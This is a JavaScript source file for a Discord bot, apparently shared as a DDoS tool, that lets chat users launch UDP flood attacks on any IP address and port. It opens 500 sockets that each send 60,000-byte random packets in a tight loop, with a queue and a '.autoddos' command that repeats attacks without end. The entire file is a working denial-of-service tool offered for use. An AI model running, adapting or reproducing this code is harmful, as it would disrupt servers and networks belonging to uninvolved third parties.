const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const dgram = require('dgram');
const crypto = require('crypto');

const bot = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
});

//Made By SYZDARK

// Replace with your Discord bot token
const token = 'TOKEN';

// Queue System
let attackQueue = [];
let isAttacking = false;
const maxQueue = 10; // change this however you want


let autoDdosActive = false;
let autoDdosInterval = null;


function processQueue(message) {
    if (attackQueue.length === 0) {
        isAttacking = false;
        return;
    }

    const { address, port, duration, user } = attackQueue.shift();
    isAttacking = true;

    startDdosAttack(message, address, port, duration);

    setTimeout(() => {
        message.channel.send(`✅ **Attack for ${user} on ${address}:${port} completed.**`);
        processQueue(message);
    }, duration * 1000);
}


function startDdosAttack(message, address, port, duration) {
    message.channel.send(`🚀 **Starting UDP attack on ${address}:${port} for ${duration} seconds.**`);

    const clients = [];
    const maxThreads = 500;

    for (let i = 0; i < maxThreads; i++) {
        const client = dgram.createSocket('udp4');
        clients.push(client);

        const attack = () => {
            const packet = crypto.randomBytes(60000); // I dont reccommend changing this
            client.send(packet, port, address, (err) => {
                if (err) {
                    console.log(`[ERROR] Thread #${i + 1} failed: ${err.message}`);
                }
            });
        };

        const interval = setInterval(attack, 0);
        setTimeout(() => {
            clearInterval(interval);
            client.close();
            if (i === maxThreads - 1) {
                console.log(`✅ Attack on ${address}:${port} completed.`);
            }
        }, duration * 1000);
    }
}

bot.on('ready', () => {
    console.log(`${bot.user.tag} has logged in.`);
});

bot.on('messageCreate', (message) => {
    if (message.author.bot) return;

    
    if (!message.content.startsWith('.')) return;

    
    if (message.content === '.help') {
        const helpEmbed = new EmbedBuilder()
            .setColor('#0099ff')
            .setTitle('Bot Commands Help')
            .setDescription('Here are the available commands:')
            .addFields(
                { name: '🚀 **.ddos <ip> <port> <time>**', value: 'Send ddos attacks ;).' },
                { name: '📄 **.queuelist**', value: 'Check the current attack queue.' },
                { name: '🔄 **.autoddos <ip> <port> <time>**', value: 'Start a continuous automatic DDOS attack.' },
                { name: '🛑 **.stopauto**', value: 'Stop the ongoing automatic DDOS attack.' },
                { name: '❓ **.help**', value: 'Display this help message.' }
            )
            .setFooter({ text: 'DDOS UDP BOT BY SYZDARK', iconURL: bot.user.displayAvatarURL() });

        message.reply({ embeds: [helpEmbed] });
    }

    
    if (message.content === '.queuelist') {
        if (attackQueue.length === 0) {
            return message.reply('📊 **Attack queue is currently empty.**');
        } else {
            const queueList = attackQueue
                .map((item, index) => `**#${index + 1}**: ${item.user} → ${item.address}:${item.port} for ${item.duration}s`)
                .join('\n');
            message.reply(`📊 **Current Attack Queue:**\n${queueList}`);
        }
    }

    // 🚀 .ddos Command
    if (message.content.startsWith('.ddos')) {
        const args = message.content.split(' ').slice(1);

        if (args.length < 3) {
            return message.reply('Usage: `.ddos <ip_address> <port> <time (max 120s)>`');
        }

        const address = args[0];
        const port = parseInt(args[1], 10);
        let duration = parseInt(args[2], 10);

        if (isNaN(port) || isNaN(duration)) {
            return message.reply('❌ Please provide valid numbers for `<port>` and `<time>`.');
        }

        if (duration > 120) {
            duration = 120;
            message.reply('⏳ Time is capped at **120 seconds** for safety.');
        }

        if (attackQueue.length >= maxQueue) {
            return message.reply(`🚦 **Attack queue is full. Please wait until an active attack finishes. (${attackQueue.length}/${maxQueue})**`);
        }

        attackQueue.push({
            user: message.author.username,
            address,
            port,
            duration,
        });

        message.reply(`✅ **Added to the attack queue at position #${attackQueue.length}.**`);
        if (!isAttacking) processQueue(message);
    }

    // 🔄 .autoddos Command
    if (message.content.startsWith('.autoddos')) {
        const args = message.content.split(' ').slice(1);

        if (args.length < 3) {
            return message.reply('Usage: `.autoddos <ip_address> <port> <time (max 120s)>`');
        }

        const address = args[0];
        const port = parseInt(args[1], 10);
        let duration = parseInt(args[2], 10);

        if (isNaN(port) || isNaN(duration)) {
            return message.reply('❌ Please provide valid numbers for `<port>` and `<time>`.');
        }

        if (duration > 120) {
            duration = 120;
            message.reply('⏳ Time is capped at **120 seconds** for safety.');
        }

        if (autoDdosActive) {
            return message.reply('❌ **An auto DDOS attack is already running. Use `.stopauto` to stop it first.**');
        }

        autoDdosActive = true;
        message.reply(`🔄 **Starting auto DDOS attack on ${address}:${port} for ${duration} seconds, repeating continuously.**`);

        autoDdosInterval = setInterval(() => {
            startDdosAttack(message, address, port, duration);
        }, duration * 1000);
    }

    // 🛑 .stopauto Command
    if (message.content === '.stopauto') {
        if (!autoDdosActive) {
            return message.reply('❌ **No auto DDOS attack is currently running.**');
        }

        clearInterval(autoDdosInterval);
        autoDdosActive = false;
        message.reply('🛑 **Auto DDOS attack has been stopped.**');
    }
});

bot.login(token);
